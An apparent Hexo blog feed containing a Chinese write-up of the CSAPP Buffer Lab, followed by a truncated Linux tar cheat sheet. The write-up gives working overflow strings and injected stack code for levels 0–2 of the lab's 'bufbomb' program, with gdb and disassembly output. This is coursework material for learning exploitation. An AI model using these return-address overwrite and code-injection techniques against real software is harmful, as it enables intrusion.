<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>只为不凡而来</title>
  <subtitle>小智的世界</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-05-11T15:02:18.846Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>wuduozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>深入理解计算机系统|CSAPP-Bufferlab</title>
    <link href="http://yoursite.com/2018/05/12/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-CSAPP-Bufferlab/"/>
    <id>http://yoursite.com/2018/05/12/深入理解计算机系统-CSAPP-Bufferlab/</id>
    <published>2018-05-11T20:29:36.000Z</published>
    <updated>2018-05-11T15:02:18.846Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用<code>缓冲区溢出漏洞</code>生成攻击代码去修改一个32位的x86可执行程序的运行时行为。</p>
<h3 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h3><ul>
<li>IA32的栈帧结构，可参考：<a href="http://wuduozhi.me/2018/05/08/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%B1%87%E7%BC%96%E7%9A%84%E4%B8%96%E7%95%8C-5/" target="_blank" rel="external">深入理解计算机系统|汇编的世界-5</a></li>
<li>gdb调试，可参考：<a href="http://wuduozhi.me/2018/03/27/%E5%B7%A5%E5%85%B7-gdb%E8%B0%83%E8%AF%95/" target="_blank" rel="external">工具|gdb调试</a></li>
</ul>
<h3 id="实验准备"><a href="#实验准备" class="headerlink" title="实验准备"></a>实验准备</h3><p>实验讲义中主要包含了以下3个可执行文件：</p>
<ul>
<li>bufbomb 你所要攻击的缓冲区炸弹程序</li>
<li>makecookie 根据你所输入的userid生成一个cookie</li>
<li>hex2raw 一个生成攻击字符串的工具</li>
</ul>
<p>值得注意的是，<code>bufbomb</code>接受如下的参数：</p>
<ul>
<li>-h 打印帮助信息</li>
<li>-u userid 你应该一直为程序提供该参数，因为远程计分服务器需要该参数，bufbomb也需要该参数去确定你生成的cookie以确定你的攻击满足了条件，并且若干关键的栈地址也和该userid生成的cookie有关</li>
<li>-n 进入’Nitro’模式，在阶段4中使用</li>
<li>-s 将你的攻击字符串作为结果提交至计分服务器</li>
</ul>
<p>首先我们要输入userid生成一个cookie供后续使用，我这里使用uesrud为<code>xzz</code>。命令及结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">user@BlackDragon ~/C/B/buflab-handout&gt; ./makecookie xzz &gt; cookie                       user@BlackDragon ~/C/B/buflab-handout&gt; cat cookie   </div><div class="line">0x52f8c747</div></pre></td></tr></table></figure>
<p>然后我们要将bufbomb反汇编以供后续攻击使用，命令及结果如下：<code>objdump -d bufbomb &gt; bufbomb.s</code> 。</p>
<p>目标程序的通过<code>getbuf</code>函数从标准输入流中读取字符串，该函数具有缓冲区溢出的漏洞，我们的实验都是通过这个函数的漏洞展开的。</p>
<p><code>getbuf</code>函数：</p>
<pre><code>/ * Buffer size for getbuf* /
#define NORMAL_BUFFER_SIZE 32

int getbuf()
{
    char buf[NORMAL_BUFFER_SIZE];
    Gets(buf);
    return 1;
}
</code></pre><p><code>getbuf</code>函数的反汇编格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">08048c04 &lt;getbuf&gt;:</div><div class="line"> 8048c04:	55                   	push   %ebp</div><div class="line"> 8048c05:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8048c07:	83 ec 38             	sub    $0x38,%esp</div><div class="line"> 8048c0a:	8d 45 d8             	lea    -0x28(%ebp),%eax</div><div class="line"> 8048c0d:	89 04 24             	mov    %eax,(%esp) &lt;-- $eax保存输入字符串存放的地址, 由栈来传递给Gets函数</div><div class="line"> 8048c10:	e8 35 ff ff ff       	call   8048b4a &lt;Gets&gt;</div><div class="line"> 8048c15:	b8 01 00 00 00       	mov    $0x1,%eax</div><div class="line"> 8048c1a:	c9                   	leave  </div><div class="line"> 8048c1b:	c3                   	ret</div></pre></td></tr></table></figure></p>
<p>注意到函数总共开辟了<code>0x38=56</code>个字节的栈空间，然后<code>lea -0x28(%ebp),%eax</code>和<code>mov %eax,(%esp)</code>进行了参数字符串起始地址的构造，考虑到栈从高地址向低地址延伸，而<code>ebp</code>指向栈底，我们可以推测缓冲区总共是0x28=40个字节。所以能得到<code>getbuf</code>函数的栈帧如下图：</p>
<p><img src="/images/CSAPP-BufferLab-01.png" alt="getbuf栈帧"></p>
<p>那么所谓的缓冲区溢出也就是破坏<code>buf</code>到返回地址的内存空间，把需要跳转的地址通过溢出填入到返回地址中，改变程序的执行顺序。</p>
<h3 id="开始攻关"><a href="#开始攻关" class="headerlink" title="开始攻关"></a>开始攻关</h3><h4 id="Level-0-Candle"><a href="#Level-0-Candle" class="headerlink" title="Level 0 Candle"></a>Level 0 Candle</h4><p>The function getbuf is called within BUFBOMB by a function test having the following C code:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">/* test */</div><div class="line">void test()</div><div class="line">&#123;</div><div class="line">    int val;</div><div class="line">    /* Put canary on stack to detect possible corruption */</div><div class="line">    volatile int local = uniqueval();</div><div class="line">    val = getbuf();</div><div class="line">    /* Check for corrupted stack */</div><div class="line">    if (local != uniqueval()) &#123;</div><div class="line">	    printf(&quot;Sabotaged!: the stack has been corrupted\n&quot;);</div><div class="line">    &#125;else if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Boom!: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    	validate(3);</div><div class="line">    &#125; else &#123;</div><div class="line">    	printf(&quot;Dud: getbuf returned 0x%x\n&quot;, val);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>现在我们希望test函数从getbuf返回时不执行下一条代码，而是跳转至函数smoke，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">void smoke()</div><div class="line">&#123;</div><div class="line">    printf(&quot;Smoke!: You called smoke()\n&quot;);</div><div class="line">    validate(0);</div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，由于smoke直接使得程序退出，所以我们不需要在意保存的%ebp的值，直接通过缓冲区溢出覆盖返回地址即可。通过反汇编得到smoke的汇编代码，可以得到smoke的起始地址<code>080490ba</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">080490ba &lt;smoke&gt;:</div><div class="line"> 80490ba:	55                   	push   %ebp</div><div class="line"> 80490bb:	89 e5                	mov    %esp,%ebp</div><div class="line"> 80490bd:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 80490c0:	c7 04 24 b5 9f 04 08 	movl   $0x8049fb5,(%esp)</div><div class="line"> 80490c7:	e8 74 f8 ff ff       	call   8048940 &lt;puts@plt&gt;</div><div class="line"> 80490cc:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490d3:	e8 0c 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 80490d8:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490df:	e8 ac f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>根据以上的信息，我们的攻击代码 level0.txt 如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 ba 90 04 08 /* 保存的%ebp以及返回地址 注意是小端机器*/</div></pre></td></tr></table></figure></p>
<p>下面我们使用hex2raw生成攻击字符串并测试。结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level0.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Smoke!: You called smoke()</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-1-Sparkler"><a href="#Level-1-Sparkler" class="headerlink" title="Level 1 Sparkler"></a>Level 1 Sparkler</h4><p>现在，我们希望getbuf返回时跳转至函数fizz同时能伪装成已经传递了cookie作为参数，该函数如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">void fizz(int val)</div><div class="line">&#123;</div><div class="line">    if (val == cookie) &#123;</div><div class="line">    	printf(&quot;Fizz!: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    	validate(1);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: You called fizz(0x%x)\n&quot;, val);</div><div class="line">    </div><div class="line">    exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们需要注意IA32中，参数是通过调用者的栈进行传递的，我们观察fizz的反汇编代码，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">0804906f &lt;fizz&gt;:</div><div class="line"> 804906f:	55                   	push   %ebp</div><div class="line"> 8049070:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049072:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049075:	8b 45 08             	mov    0x8(%ebp),%eax</div><div class="line"> 8049078:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 804907e:	75 1e                	jne    804909e &lt;fizz+0x2f&gt;</div><div class="line"> 8049080:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049084:	c7 04 24 97 9f 04 08 	movl   $0x8049f97,(%esp)</div><div class="line"> 804908b:	e8 50 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049090:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)</div><div class="line"> 8049097:	e8 48 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 804909c:	eb 10                	jmp    80490ae &lt;fizz+0x3f&gt;</div><div class="line"> 804909e:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 80490a2:	c7 04 24 b8 a1 04 08 	movl   $0x804a1b8,(%esp)</div><div class="line"> 80490a9:	e8 32 f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 80490ae:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 80490b5:	e8 d6 f8 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure>
<p>从上述反汇编代码的第1行第4行和第5行，我们可以知道函数<code>fizz</code>的起始地址为<code>0804906f</code>，<code>val</code>保存在<code>0x8(%ebp)</code>中，cookie保存在固定的地址<code>0x804c1e4</code>中。根据以上的信息，我们的攻击代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 6f 90 04 08 /* 保存的%ebp以及返回地址 */</div><div class="line">00 00 00 00 47 c7 f8 52 /* cookie */</div></pre></td></tr></table></figure>
<p>注意到，从<code>getbuf</code>返回的时候，内存是这样的一个状态：</p>
<p><img src="/images/CSAPP-BufferLab-02.png" alt="level-01"></p>
<p>此时，已经跳转到 <code>fizz</code>函数哪里了，但现在的<code>%ebp</code>的值是<code>0x00000000</code>,不过幸好有<code>mov    %esp,%ebp</code>这条指令，把<code>%ebp</code>拯救回来，才能使<code>mov    0x8(%ebp),%eax</code>能得到我们放入的cookie。这时的内存状态是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-03.png" alt="level-01"></p>
<p>执行结果:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level1.txt | ./hex2raw | ./bufbomb -u xzz </div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Fizz!: You called fizz(0x52f8c747)</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
<h4 id="Level-2-Firecracker"><a href="#Level-2-Firecracker" class="headerlink" title="Level 2 Firecracker"></a>Level 2 Firecracker</h4><p>bufbomb中包含了一个全局变量global_value以及函数bang，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">int global_value = 0;</div><div class="line">void bang(int val)</div><div class="line">&#123;</div><div class="line">    if (global_value == cookie) &#123;</div><div class="line">	    printf(&quot;Bang!: You set global_value to 0x%x\n&quot;, global_value);</div><div class="line">    	validate(2);</div><div class="line">    &#125; else</div><div class="line">    	printf(&quot;Misfire: global_value = 0x%x\n&quot;, global_value);</div><div class="line"></div><div class="line">	exit(0);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>在该阶段中，我们希望函数能在返回时跳转至bang，但是在这之前，要将全局变量global_value的值设置为cookie。那怎么设置呢？<strong>在栈上构建一段代码，然后在栈上执行相应的代码，实现相关的修改，最后从栈上返回至函数bang</strong>。</p>
<p>首先我们需要确定在进入getbuf时的栈地址，具体的命令和操作如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gdb bufbomb</div><div class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</div><div class="line">Copyright (C) 2014 Free Software Foundation, Inc.</div><div class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</div><div class="line">This is free software: you are free to change and redistribute it.</div><div class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</div><div class="line">and &quot;show warranty&quot; for details.</div><div class="line">This GDB was configured as &quot;i686-linux-gnu&quot;.</div><div class="line">Type &quot;show configuration&quot; for configuration details.</div><div class="line">For bug reporting instructions, please see:</div><div class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</div><div class="line">Find the GDB manual and other documentation resources online at:</div><div class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</div><div class="line">For help, type &quot;help&quot;.</div><div class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</div><div class="line">Reading symbols from bufbomb...(no debugging symbols found)...done.</div><div class="line">(gdb) break getbuf</div><div class="line">Breakpoint 1 at 0x8048c0a</div><div class="line">(gdb) run -u xzz</div><div class="line">Starting program: /home/ubuntu/mybuflab_solved/bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line"></div><div class="line">Breakpoint 1, 0x08048c0a in getbuf ()</div><div class="line">(gdb) disas getbuf</div><div class="line">Dump of assembler code for function getbuf:</div><div class="line">   0x08048c04 &lt;+0&gt;:	push   %ebp</div><div class="line">   0x08048c05 &lt;+1&gt;:	mov    %esp,%ebp</div><div class="line">   0x08048c07 &lt;+3&gt;:	sub    $0x38,%esp</div><div class="line">=&gt; 0x08048c0a &lt;+6&gt;:	lea    -0x28(%ebp),%eax</div><div class="line">   0x08048c0d &lt;+9&gt;:	mov    %eax,(%esp)</div><div class="line">   0x08048c10 &lt;+12&gt;:	call   0x8048b4a &lt;Gets&gt;</div><div class="line">   0x08048c15 &lt;+17&gt;:	mov    $0x1,%eax</div><div class="line">   0x08048c1a &lt;+22&gt;:	leave  </div><div class="line">   0x08048c1b &lt;+23&gt;:	ret    </div><div class="line">End of assembler dump.</div><div class="line">(gdb) print /x $ebp</div><div class="line">$1 = 0x55683450</div><div class="line">(gdb) print /x $esp</div><div class="line">$2 = 0x55683418</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
<p>通过在gdb中添加断点并观察，我们可以确定在执行函数<code>getbuf</code>时，栈底<code>%ebp</code>的值为<code>0x55683450</code>。</p>
<p>接下来我们要通过gcc和objdump生成攻击代码。我们首先新建一个level2-exploit.s文件，在其中编写相应的攻击代码，攻击代码的作用就是设置全解变量的值为cookie的值，如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mov $0x52f8c747, %eax</div><div class="line">mov %eax, 0x804c1ec  ;设置全局变量</div><div class="line">add $16, %esp ;修改栈顶</div><div class="line">ret ;返回</div></pre></td></tr></table></figure>
<p>然后我们依次使用<code>gcc -m32 -c level2-exploit.s</code>和<code>objdump -d level2-exploit.o</code>将攻击代码汇编和反汇编，具体的命令和结果如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ gcc -m32 -c level2-exploit.s </div><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ objdump -d level2-exploit.o</div><div class="line"></div><div class="line">level2-exploit.o:     file format elf32-i386</div><div class="line"></div><div class="line"></div><div class="line">Disassembly of section .text:</div><div class="line"></div><div class="line">00000000 &lt;.text&gt;:</div><div class="line">   0:	b8 47 c7 f8 52       	mov    $0x52f8c747,%eax</div><div class="line">   5:	a3 ec c1 04 08       	mov    %eax,0x804c1ec</div><div class="line">   a:	83 c4 10             	add    $0x10,%esp</div><div class="line">   d:	c3                   	ret</div></pre></td></tr></table></figure>
<p>所以我们构建的攻击代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00</div><div class="line">00 00 00 00 00 00 00 00 /* 前40个字节 */</div><div class="line">00 00 00 00 58 34 68 55 /* 保存的%ebp以及返回地址(在栈上) */</div><div class="line">b8 47 c7 f8 52 a3 ec c1 </div><div class="line">04 08 83 c4 10 c3 00 00 /* 攻击代码 */</div><div class="line">22 90 04 08  			/* 返回地址指向函数bang */</div></pre></td></tr></table></figure></p>
<p>可以知道，我们的攻击思路是：<strong>在getbuf函数返回的时候，先将<code>pc</code>跳转到我们刚刚设计的攻击代码开始的地方，执行我们设计的攻击代码，设置全局变量的值，然后在跳转到<code>bang</code>函数执行。</strong></p>
<p>可能疑惑为什么要这么做？是怎么知道全局变量的地址的呢？为什么要修改栈指针且要加16呢？接下来一一解答：</p>
<p>对于全局变量的指针，我们可以通过<code>bang</code>函数的反汇编代码得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">08049022 &lt;bang&gt;:</div><div class="line"> 8049022:	55                   	push   %ebp</div><div class="line"> 8049023:	89 e5                	mov    %esp,%ebp</div><div class="line"> 8049025:	83 ec 18             	sub    $0x18,%esp</div><div class="line"> 8049028:	a1 ec c1 04 08       	mov    0x804c1ec,%eax</div><div class="line"> 804902d:	3b 05 e4 c1 04 08    	cmp    0x804c1e4,%eax</div><div class="line"> 8049033:	75 1e                	jne    8049053 &lt;bang+0x31&gt;</div><div class="line"> 8049035:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049039:	c7 04 24 90 a1 04 08 	movl   $0x804a190,(%esp)</div><div class="line"> 8049040:	e8 9b f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049045:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)</div><div class="line"> 804904c:	e8 93 00 00 00       	call   80490e4 &lt;validate&gt;</div><div class="line"> 8049051:	eb 10                	jmp    8049063 &lt;bang+0x41&gt;</div><div class="line"> 8049053:	89 44 24 04          	mov    %eax,0x4(%esp)</div><div class="line"> 8049057:	c7 04 24 79 9f 04 08 	movl   $0x8049f79,(%esp)</div><div class="line"> 804905e:	e8 7d f8 ff ff       	call   80488e0 &lt;printf@plt&gt;</div><div class="line"> 8049063:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)</div><div class="line"> 804906a:	e8 21 f9 ff ff       	call   8048990 &lt;exit@plt&gt;</div></pre></td></tr></table></figure></p>
<p>在level-1中我们知道<code>0x804c1e4</code>是cookie的地址，那么这里<code>0x804c1ec</code>显然就是全局变量的地址了。</p>
<p>从getbuf返回时，我们的内存是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-04.png" alt="level-2"></p>
<p>我们很巧妙的把pc指向了我们设置的攻击代码处，然后开始执行我们设置的代码，当指行完 <code>add    $0x10,%esp</code>的时候，内存空间是这样的：</p>
<p><img src="/images/CSAPP-BufferLab-05.png" alt="level-2"></p>
<p>然后执行<code>ret</code>，把栈顶的bang函数的首地址弹出给pc，在改变全局变量的值后，顺利地跳转到bang函数开始执行。</p>
<p>下面我们使用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">ubuntu@VM-162-156-ubuntu:~/mybuflab_solved$ cat level2.txt | ./hex2raw | ./bufbomb -u xzz</div><div class="line">Userid: xzz</div><div class="line">Cookie: 0x52f8c747</div><div class="line">Type string:Bang!: You set global_value to 0x52f8c747</div><div class="line">VALID</div><div class="line">NICE JOB!</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Buffer Lab是传统的32位实验，现在已经被Attack Lab替代。在该实验中，需要利用&lt;code&gt;缓冲区溢出漏洞&lt;/code&gt;生成
    
    </summary>
    
      <category term="深入理解计算机系统|" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入理解计算机系统|" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>Linux|Linux命令小抄</title>
    <link href="http://yoursite.com/2018/05/11/Linux-Linux%E5%91%BD%E4%BB%A4%E5%B0%8F%E6%8A%84/"/>
    <id>http://yoursite.com/2018/05/11/Linux-Linux命令小抄/</id>
    <published>2018-05-10T23:16:31.000Z</published>
    <updated>2018-05-10T15:58:35.395Z</updated>
    
    <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本文章记录自己学习Linux路上的点点滴滴。</p>
<h2 id="文本操作命令"><a href="#文本操作命令" class="headerlink" title="文本操作命令"></a>文本操作命令</h2><h3 id="tar"><a href="#tar" class="headerlink" title="tar"></a>tar</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-c: 建立压缩档案</div><div class="line">-x：解压</div><div class="line">-t：查看内容</div><div class="line">-r：向压缩归档文件末尾追加文件</div><div class="line">-u：更新原压缩包中的文件</div></pre></td></tr></table></figure>
<p>这五个是独立的命令，压缩解压都要用到其中一个，可以和别的命令连用但只能用其中一个。下面的参数是根据需要在压缩或解压档案时可选的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-z：有gzip属性的</div><div class="line">-j：有bz2属性的</div><div class="line">-Z：有compress属性的</div><div class="line">-v：显示所有过程</div><div class="line">-O：将文件解开到标准输出</div></pre></td></tr></table></figure></p>
<p>下面的参数-f是必须的</p>
<p>-f: 使用档案名字，切记，这个参数是最后一个参数，后面只能接档案名。</p>
<p><code>tar -cf all.tar *.jpg</code><br>这条命令是将所有.jpg的文件打成一个名为all.tar的包。-c是表示产生新的包，-f指定包的文件名。</p>
<p><code>tar -rf all.tar *.gif</code><br>这条命令是将所有.gif的文件增加到all.tar的包里面去。-r是表示增加文件的意思。</p>
<p><code>tar -uf all.tar logo.gif</code><br>这条命令是更新原来tar包all.tar中logo.gif文件，-u是表示更新文件的意思。</p>
<p><code>tar -tf all.tar</code><br>这条命令是列出all.tar包中所有文件，-t是列出文件的意思</p>
<p><code>tar -xf all.tar</code><br>这条命令是解出all.tar包中所有文件，-x是解开的意思</p>
<p>压缩的一些例子</p>
<pre><code>tar –cvf jpg.tar *.jpg  将目录里所有jpg文件打包成tar.jpg
tar –czf jpg.tar.gz *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用gzip压缩，生成一个gzip压缩过的包，命名为jpg.tar.gz
tar –cjf jpg.tar.bz2 *.jpg 将目录里所有jpg文件打包成jpg.tar后，并且将其用bzip2压缩，生成一个bzip2压缩过的包，命名为jpg.tar.bz2
tar –cZf jpg.tar.Z *.jpg   将目录里所有jpg文件打包成jpg.tar后，并且将其用compress压缩，生成一个umcompress压缩过的包，命名为jpg.tar.Z
rar a jpg.rar *.jpg rar格式的压缩，需要先下载rar for linux
zip jpg.zip *.jpg   zip格式的压缩，需要先下载zip for linux
</code></pre><p>解压的一些例子</p>
<pre><code>tar –xvf file.tar  解压 tar包
tar -xzvf file.tar.gz 解压tar.gz
tar -xjvf file.tar.bz2   解压 tar.bz2
